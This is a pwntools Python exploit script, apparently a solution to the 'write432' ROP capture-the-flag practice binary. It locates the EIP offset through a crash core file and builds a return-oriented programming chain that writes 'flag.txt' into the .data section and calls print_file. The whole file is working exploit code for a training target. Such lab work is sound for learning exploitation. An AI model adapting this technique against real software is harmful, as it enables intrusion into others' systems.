from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    # Start the exploit against the target
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-peda
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './write432'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


def find_eip(pattern_size, p):
    # We will send a 'cyclic' pattern which overwrites the return address on the stack
    payload = cyclic(pattern_size)
    # PWN
    p.sendlineafter('>', payload)
    # Wait for the process to crash
    p.wait()
    # Open up the corefile
    core = p.corefile
    # Print out the address of EIP at the time of crashing
    eip_value = core.eip
    eip_offset = cyclic_find(eip_value)
    info('located EIP offset at {a}'.format(a=eip_offset))
    # Return the EIP offset
    return eip_offset


# Start program
io = start()

# Address of .data section (size=8 bytes)
data_section_address = 0x0804a018

# We will pop address of .data section into edi
# Then pop the string (flag.txt) into ebp
pop_edi_pop_ebp = 0x080485aa  # pop edi; pop ebp; ret;

# We will then move the string from ebp (flag.txt) into memory location stored in edi
mov_edi_ebp = 0x08048543  # mov dword ptr[edi], ebp; ret

# Finally we call print file function, passing in the address of the string (flag.txt)
print_file = 0x80483d0

# Print out important addresses
info("%#x data_section_address", data_section_address)
info("%#x pop_edi_pop_ebp", pop_edi_pop_ebp)
info("%#x mov_edi_ebp", mov_edi_ebp)
info("%#x print_file", print_file)

# Pass in pattern_size, get back EIP offset
eip_offset = find_eip(100, start())

# Craft payload which injects "flag.txt" into data section of memory
# And calls print_file() with the string memory location
payload = flat(
    asm('nop') * eip_offset,  # Offset - 44 bytes
    pop_edi_pop_ebp,  # Pop .data (1) location into edi and 4 byte string (2) to ebp
    data_section_address,  # 1
    'flag',  # 2
    mov_edi_ebp,  # Move string (2) to memory location (1) stored in edi

    # Repeat for remaining part of string
    pop_edi_pop_ebp,  # Pop .data (1) location into edi and 4 byte string (2) to ebp
    data_section_address + 0x4,  # 1 (an extra 4 bytes since we wrote "flag")
    '.txt',  # 2
    mov_edi_ebp,  # Move string (2) to memory location (1) stored in edi

    print_file,  # Call print_file()
    0x0,  # Return pointer
    data_section_address  # Location of flag.txt string
)

# Send the payload to a new copy of the process
io = start()
io.sendlineafter('>', payload)
io.recvuntil('Thank you!\n')

# Get our flag!
flag = io.recv()
success(flag)
